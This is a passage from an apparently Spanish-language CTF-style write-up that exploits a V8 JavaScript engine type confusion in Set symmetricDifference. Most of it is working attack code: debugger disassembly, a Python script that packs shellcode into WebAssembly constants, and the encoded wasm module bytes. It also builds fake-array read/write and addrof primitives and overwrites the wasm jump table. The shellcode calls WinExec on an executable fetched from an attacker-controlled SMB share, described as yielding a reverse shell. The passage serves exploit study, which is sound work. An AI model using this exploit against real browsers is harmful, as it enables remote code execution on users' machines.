0x7eb906573755cb8n,
0x7eb9020e0c14890n,
0x7eb3030312e0d48n,
0x7eb909090905090n,
0x7eb90302e382eb8n,
0x7eb20e0c1489090n,
0x7eb30315c5c0d48n,
0x7eb909090509090n,
0x7eb5a056ae18948n,
0xd3ff30ec8348n,</span>
</code></pre></div></div><br>

<p class="plain-text">Los primeros <code class="language-plaintext highlighter-rouge">8</code> qwords se almacenan en un registro pero a partir del <code class="language-plaintext highlighter-rouge">9</code> se agrega una instrucción <code class="language-plaintext highlighter-rouge">vmovsd</code> que guarda el valor en una variable, pero esta instrucción aumenta <code class="language-plaintext highlighter-rouge">5</code> bytes de distancia entre los qwords, luego del valor <code class="language-plaintext highlighter-rouge">20</code> la instrucción contiene <code class="language-plaintext highlighter-rouge">3</code> bytes más por lo que la instrucción <code class="language-plaintext highlighter-rouge">jmp</code> saltará un par de bytes más</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> u rip L4d
00000290`0eb01800 55                   push    rbp
00000290`0eb01801 4889e5               mov     rbp,rsp
00000290`0eb01804 6a08                 push    8
00000290`0eb01806 56                   push    rsi
00000290`0eb01807 4881ec90000000       sub     rsp,90h
00000290`0eb0180e 493b65a0             cmp     rsp,qword ptr [r13-60h]
00000290`0eb01812 0f86da010000         jbe     00000290`0eb019f2
00000290`0eb01818 49ba4831c9909090eb07 mov     r10,7EB909090C93148h
00000290`0eb01822 c4c1f96ec2           vmovq   xmm0,r10
00000290`0eb01827 49ba65488b716090eb07 mov     r10,7EB9060718B4865h
00000290`0eb01831 c4c1f96eca           vmovq   xmm1,r10
00000290`0eb01836 49ba488b76189090eb07 mov     r10,7EB909018768B48h
00000290`0eb01840 c4c1f96ed2           vmovq   xmm2,r10
00000290`0eb01845 49ba488b76209090eb07 mov     r10,7EB909020768B48h
00000290`0eb0184f c4c1f96eda           vmovq   xmm3,r10
00000290`0eb01854 49ba488b3648ad90eb07 mov     r10,7EB90AD48368B48h
00000290`0eb0185e c4c1f96ee2           vmovq   xmm4,r10
00000290`0eb01863 49ba488b58209090eb07 mov     r10,7EB909020588B48h
00000290`0eb0186d c4c1f96eea           vmovq   xmm5,r10
00000290`0eb01872 49bab98012000090eb07 mov     r10,7EB9000001280B9h
00000290`0eb0187c c4c1f96ef2           vmovq   xmm6,r10
00000290`0eb01881 49ba4801cb909090eb07 mov     r10,7EB909090CB0148h
00000290`0eb0188b c4c1f96efa           vmovq   xmm7,r10
00000290`0eb01890 c5fb1145d8           vmovsd  qword ptr [rbp-28h],xmm0
00000290`0eb01895 49ba682e65786590eb07 mov     r10,7EB906578652E68h
00000290`0eb0189f c4c1f96ec2           vmovq   xmm0,r10
00000290`0eb018a4 c5fb114dd0           vmovsd  qword ptr [rbp-30h],xmm1
00000290`0eb018a9 49ba4831c0909090eb07 mov     r10,7EB909090C03148h
00000290`0eb018b3 c4c1f96eca           vmovq   xmm1,r10
00000290`0eb018b8 c5fb1155c8           vmovsd  qword ptr [rbp-38h],xmm2
00000290`0eb018bd 49bab86172656490eb07 mov     r10,7EB9064657261B8h
00000290`0eb018c7 c4c1f96ed2           vmovq   xmm2,r10
00000290`0eb018cc c5fb115dc0           vmovsd  qword ptr [rbp-40h],xmm3
00000290`0eb018d1 49ba48c1e0209090eb07 mov     r10,7EB909020E0C148h
00000290`0eb018db c4c1f96eda           vmovq   xmm3,r10
00000290`0eb018e0 c5fb1165b8           vmovsd  qword ptr [rbp-48h],xmm4
00000290`0eb018e5 49ba480d725c7368eb07 mov     r10,7EB68735C720D48h
00000290`0eb018ef c4c1f96ee2           vmovq   xmm4,r10
00000290`0eb018f4 c5fb116db0           vmovsd  qword ptr [rbp-50h],xmm5
00000290`0eb018f9 49ba509090909090eb07 mov     r10,7EB909090909050h
00000290`0eb01903 c4c1f96eea           vmovq   xmm5,r10
00000290`0eb01908 c5fb1175a8           vmovsd  qword ptr [rbp-58h],xmm6
00000290`0eb0190d 49bab85c75736590eb07 mov     r10,7EB906573755CB8h
00000290`0eb01917 c4c1f96ef2           vmovq   xmm6,r10
00000290`0eb0191c c5fb117da0           vmovsd  qword ptr [rbp-60h],xmm7
00000290`0eb01921 49ba9048c1e02090eb07 mov     r10,7EB9020E0C14890h
00000290`0eb0192b c4c1f96efa           vmovq   xmm7,r10
00000290`0eb01930 c5fb114598           vmovsd  qword ptr [rbp-68h],xmm0
00000290`0eb01935 49ba480d2e313030eb07 mov     r10,7EB3030312E0D48h
00000290`0eb0193f c4c1f96ec2           vmovq   xmm0,r10
00000290`0eb01944 c5fb114d90           vmovsd  qword ptr [rbp-70h],xmm1
00000290`0eb01949 49ba905090909090eb07 mov     r10,7EB909090905090h
00000290`0eb01953 c4c1f96eca           vmovq   xmm1,r10
00000290`0eb01958 c5fb115588           vmovsd  qword ptr [rbp-78h],xmm2
00000290`0eb0195d 49bab82e382e3090eb07 mov     r10,7EB90302E382EB8h
00000290`0eb01967 c4c1f96ed2           vmovq   xmm2,r10
00000290`0eb0196c c5fb115d80           vmovsd  qword ptr [rbp-80h],xmm3
00000290`0eb01971 49ba909048c1e020eb07 mov     r10,7EB20E0C1489090h
00000290`0eb0197b c4c1f96eda           vmovq   xmm3,r10
00000290`0eb01980 c5fb11a578ffffff     vmovsd  qword ptr [rbp-88h],xmm4
00000290`0eb01988 49ba480d5c5c3130eb07 mov     r10,7EB30315C5C0D48h
00000290`0eb01992 c4c1f96ee2           vmovq   xmm4,r10
00000290`0eb01997 c5fb11ad70ffffff     vmovsd  qword ptr [rbp-90h],xmm5
00000290`0eb0199f 49ba909050909090eb07 mov     r10,7EB909090509090h
00000290`0eb019a9 c4c1f96eea           vmovq   xmm5,r10
00000290`0eb019ae c5fb11b568ffffff     vmovsd  qword ptr [rbp-98h],xmm6
00000290`0eb019b6 49ba4889e16a055aeb07 mov     r10,7EB5A056AE18948h
00000290`0eb019c0 c4c1f96ef2           vmovq   xmm6,r10
00000290`0eb019c5 c5fb11bd60ffffff     vmovsd  qword ptr [rbp-0A0h],xmm7
00000290`0eb019cd 49ba4883ec30ffd30000 mov     r10,0D3FF30EC8348h
00000290`0eb019d7 c4c1f96efa           vmovq   xmm7,r10
00000290`0eb019dc 4c8b5677             mov     r10,qword ptr [rsi+77h]
00000290`0eb019e0 41812adc010000       sub     dword ptr [r10],1DCh
00000290`0eb019e7 0f8813000000         js      00000290`0eb01a00
00000290`0eb019ed 488be5               mov     rsp,rbp
00000290`0eb019f0 5d                   pop     rbp
00000290`0eb019f1 c3                   ret</span>
</code></pre></div></div><br>

<p class="plain-text">En los primeros ejecutaremos la instrucción <code class="language-plaintext highlighter-rouge">jmp</code> será de <code class="language-plaintext highlighter-rouge">9</code> bytes más adelante, los siguientes saltarán <code class="language-plaintext highlighter-rouge">5</code> bytes más adelante y los últimos <code class="language-plaintext highlighter-rouge">8</code> bytes más que el primero</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)):
    shellcode[i]</span><span class="o"> =</span><span class="p"> shellcode[i].ljust(</span><span class="mi">6</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
    </span><span class="o">if</span><span class="p"> i</span><span class="o"> !=</span><span class="no"> len</span><span class="p">(shellcode)</span><span class="o"> -</span><span class="mi"> 1</span><span class="p">:
        </span><span class="o">if</span><span class="p"> i</span><span class="o"> &lt </span><span class="mi">7</span><span class="p">:
            shellcode[i]</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x9"</span><span class="p">)
        </span><span class="o">elif</span><span class="p"> i</span><span class="o"> ></span><span class="mi"> 6</span><span class="o"> and</span><span class="p"> i</span><span class="o"> &lt </span><span class="mi">19</span><span class="p">:
            shellcode[i]</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0xe"</span><span class="p">)
        </span><span class="o">elif</span><span class="p"> i</span><span class="o"> ></span><span class="mi"> 18</span><span class="p">:
            shellcode[i]</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x11"</span><span class="p">)

    shellcode[i]</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shellcode[i][::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex(),</span><span class="mi"> 16</span><span class="p">)  
    </span><span class="no">print</span><span class="p">(</span><span class="no">hex</span><span class="p">(shellcode[i]) </span><span class="o">+ </span><span class="s">"n,"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces obtenemos los qwords y luego de pasarlo a <code class="language-plaintext highlighter-rouge">wasm</code> obtenemos el array de enteros, luego sobrescribimos la <code class="language-plaintext highlighter-rouge">jump_table_start</code> con la dirección del shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3</span><span class="p"> shellcode.py  
0x7eb909090c93148n,
0x7eb9060718b4865n,
0x7eb909018768b48n,
0x7eb909020768b48n,
0x7eb90ad48368b48n,
0x7eb909020588b48n,
0x7eb9000001280b9n,
0xceb909090cb0148n,
0xceb906578652e68n,
0xceb909090c03148n,
0xceb9064657261b8n,
0xceb909020e0c148n,
0xceb68735c720d48n,
0xceb909090909050n,
0xceb906573755cb8n,
0xceb9020e0c14890n,
0xceb3030312e0d48n,
0xceb909090905090n,
0xceb90302e382eb8n,
0xfeb20e0c1489090n,
0xfeb30315c5c0d48n,
0xfeb909090509090n,
0xfeb5a056ae18948n,
0xd3ff30ec8348n,</span>
</code></pre></div></div><br>
  
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> wasmCode</span><span class="o"> = new</span><span class="na"> Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 109</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 4</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 96</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 3</span><span class="p">,</span><span class="mi"> 2</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 8</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 4</span><span class="p">,</span><span class="mi"> 109</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 105</span><span class="p">,</span><span class="mi"> 110</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 10</span><span class="p">,</span><span class="mi"> 222</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 219</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 201</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 113</span><span class="p">,</span><span class="mi"> 96</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 118</span><span class="p">,</span><span class="mi"> 24</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 118</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 54</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 173</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 88</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 185</span><span class="p">,</span><span class="mi"> 128</span><span class="p">,</span><span class="mi"> 18</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 203</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 104</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 120</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 192</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 184</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 114</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 100</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 193</span><span class="p">,</span><span class="mi"> 224</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 13</span><span class="p">,</span><span class="mi"> 114</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 104</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 184</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 117</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 193</span><span class="p">,</span><span class="mi"> 224</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 13</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 184</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 56</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 193</span><span class="p">,</span><span class="mi"> 224</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 13</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 137</span><span class="p">,</span><span class="mi"> 225</span><span class="p">,</span><span class="mi"> 106</span><span class="p">,</span><span class="mi"> 5</span><span class="p">,</span><span class="mi"> 90</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 131</span><span class="p">,</span><span class="mi"> 236</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 255</span><span class="p">,</span><span class="mi"> 211</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 11</span><span class="p">]);  

</span><span class="no">let</span><span class="p"> wasmModule</span><span class="o"> = new</span><span class="p"> WebAssembly.Module(wasmCode);
</span><span class="no">let</span><span class="p"> wasmInstance</span><span class="o"> = new</span><span class="p"> WebAssembly.Instance(wasmModule);
</span><span class="no">let</span><span class="p"> main</span><span class="o"> =</span><span class="p"> wasmInstance.exports.main;

</span><span class="no">let</span><span class="p"> wasmInstance_addr</span><span class="o"> =</span><span class="p"> addrof(wasmInstance);
</span><span class="no">let</span><span class="p"> jump_table_start</span><span class="o"> =</span><span class="p"> ftoi(aar(wasmInstance_addr </span><span class="o">+ </span><span class="mi">0x47n</span><span class="p">));
aaw(wasmInstance_addr </span><span class="o">+ </span><span class="mi">0x47n</span><span class="p">, jump_table_start </span><span class="o">+</span><span class="mi"> 0x81an</span><span class="p">);</span><span class="c1"> // overwrite instruction pointer
</span><span class="p">
main(); </span><span class="c1">// execute shellcode</span>
</code></pre></div></div><br>

<p class="plain-text">Al llamar a la función <code class="language-plaintext highlighter-rouge">main</code> sabemos que se ejecuta el shellcode y eventualmente llega al <code class="language-plaintext highlighter-rouge">WinExec</code> que ejecutará un archivo <code class="language-plaintext highlighter-rouge">exe</code> cargado desde un recurso smb</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp kernel32!WinExec
breakpoint 0 redefined

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
KERNEL32!WinExec:
00007ffd`d18b8600 488bc4          mov     rax,rsp  

</span><span class="ro">0:000></span><span class="p"> da rcx
00000041`9c3fe4f0  "\\10.8.0.100\user\shared.exe"

</span><span class="ro">0:000></span><span class="p"> r rdx
rdx=0000000000000005</span>
</code></pre></div></div><br>

<p class="plain-text">El exploit final a través un <code class="language-plaintext highlighter-rouge">type confusión</code> nos da una primitiva de escritura que nos permite sobrescribir la <code class="language-plaintext highlighter-rouge">jump_table_start</code> con la dirección del shellcode que cargará el archivo <code class="language-plaintext highlighter-rouge">exe</code> del recurso smb que controlamos y ejecutará una reverse shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let </span><span class="p">fi_buf</span><span class="o"> = new</span><span class="na"> ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);
</span><span class="no">let</span><span class="p"> f_buf</span><span class="o"> = new</span><span class="na"> Float64Array</span><span class="p">(fi_buf);
</span><span class="no">let</span><span class="p"> i_buf</span><span class="o"> = new</span><span class="na"> BigUint64Array</span><span class="p">(fi_buf);

</span><span class="no">function </span><span class="na">ftoi</span><span class="p">(</span><span class="ra">f</span><span class="p">) {
    f_buf[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> f;
    </span><span class="o">return</span><span class="p"> i_buf[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">function</span><span class="na"> itof</span><span class="p">(</span><span class="ra">i</span><span class="p">) {
    i_buf[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> i;
    </span><span class="o">return</span><span class="p"> f_buf[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">function</span><span class="na"> hex</span><span class="p">(</span><span class="ra">i</span><span class="p">) {
    </span><span class="o">return</span><span class="s"> '0x'</span><span class="o"> +</span><span class="p"> i.toString(</span><span class="mi">16</span><span class="p">);
}

</span><span class="no">function </span><span class="na">aar</span><span class="p">(</span><span class="ra">addr</span><span class="p">) {
    elements </span><span class="o">= </span><span class="p">addr</span><span class="o"> -</span><span class="mi"> 8n</span><span class="o"> +</span><span class="mi"> 1n</span><span class="p">;
    fake_arr_struct[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements </span><span class="o">| </span><span class="p">length </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);
    </span><span class="o">return</span><span class="p"> fake_arr[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">function</span><span class="na"> aaw</span><span class="p">(</span><span class="ra">addr</span><span class="p">,</span><span class="ra"> value</span><span class="p">) {
    elements</span><span class="o"> =</span><span class="p"> addr</span><span class="o"> -</span><span class="mi"> 8n</span><span class="o"> +</span><span class="mi"> 1n</span><span class="p">;
    fake_arr_struct[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements</span><span class="o"> |</span><span class="p"> length </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);
    fake_arr[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(value);
}

</span><span class="no">function </span><span class="p">addrof(</span><span class="ra">obj</span><span class="p">) {
    obj_arr[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> obj;
    </span><span class="o">return</span><span class="p"> ftoi(aar(obj_arr_addr)) </span><span class="o">&</span><span class="mi"> 0xffffffffn</span><span class="p">;
}

</span><span class="no">let</span><span class="p"> receiver</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();
</span><span class="no">let</span><span class="p"> other</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt</span><span class="mi"> 32</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    receiver.add(i);
}

</span><span class="no">let</span><span class="p"> fake_arr_struct;
</span><span class="no">let</span><span class="p"> obj_arr;

other.</span><span class="na">keys</span><span class="o"> =</span><span class="p"> ()</span><span class="no"> =></span><span class="p"> {
    fake_arr_struct </span><span class="o">= </span><span class="p">[</span><span class="mi">1.1</span><span class="p">,</span><span class="mi"> 2.2</span><span class="p">,</span><span class="mi"> 3.3</span><span class="p">];
    receiver.add(</span><span class="mi">32</span><span class="p">);
    obj_arr </span><span class="o">= </span><span class="p">[{}];
    </span><span class="o">return</span><span class="p"> other[</span><span class="na">Symbol</span><span class="p">.iterator]();
}

</span><span class="no">let</span><span class="p"> result</span><span class="o"> =</span><span class="p"> receiver.symmetricDifference(other);

</span><span class="no">let</span><span class="p"> map</span><span class="o"> =</span><span class="mi"> 0x10ed71n</span><span class="p">;
</span><span class="no">let</span><span class="p"> properties</span><span class="o"> =</span><span class="mi"> 0x6cdn</span><span class="p">;
</span><span class="no">let</span><span class="p"> elements</span><span class="o"> =</span><span class="mi"> 0x41414141n</span><span class="p">;
</span><span class="no">let</span><span class="p"> length</span><span class="o"> =</span><span class="mi"> 1n</span><span class="o"> &lt&lt</span><span class="mi"> 1n</span><span class="p">;

fake_arr_struct[</span><span class="mi">1</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(map </span><span class="o">| </span><span class="p">properties </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);
fake_arr_struct[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements </span><span class="o">|</span><span class="p"> length </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt </span><span class="mi">0x10</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    result.delete(i);
}

</span><span class="no">let</span><span class="p"> fake_arr</span><span class="o"> =</span><span class="p"> result.size;

</span><span class="no">let</span><span class="p"> marker;
</span><span class="no">let</span><span class="p"> leaked;

marker</span><span class="o"> =</span><span class="mi"> 0x4141414141414141n</span><span class="p">;
fake_arr_struct[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(marker);

</span><span class="no">let</span><span class="p"> fake_arr_addr</span><span class="o"> =</span><span class="mi"> 0x4a000n</span><span class="p">;

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt</span><span class="mi"> 0x1000</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    leaked</span><span class="o"> =</span><span class="p"> ftoi(aar(fake_arr_addr));
    </span><span class="o">if</span><span class="p"> (leaked</span><span class="o"> ==</span><span class="p"> marker)</span><span class="o"> break</span><span class="p">;
    fake_arr_addr</span><span class="o"> +=</span><span class="mi"> 4n</span><span class="p">;
}

fake_arr_addr</span><span class="o"> +=</span><span class="mi"> 8n</span><span class="p">;

marker</span><span class="o"> =</span><span class="p"> fake_arr_addr </span><span class="o">+ </span><span class="mi">1n</span><span class="p">;
obj_arr[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> fake_arr;

</span><span class="no">let</span><span class="p"> obj_arr_addr</span><span class="o"> =</span><span class="p"> fake_arr_addr</span><span class="o"> +</span><span class="mi"> 0x30n</span><span class="p">;

</span><span class="no">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt </span><span class="mi">0x1000</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    leaked</span><span class="o"> =</span><span class="p"> ftoi(aar(obj_arr_addr)) </span><span class="o">&</span><span class="mi"> 0xffffffffn</span><span class="p">;
    </span><span class="o">if</span><span class="p"> (leaked</span><span class="o"> ==</span><span class="p"> marker)</span><span class="o"> break</span><span class="p">;
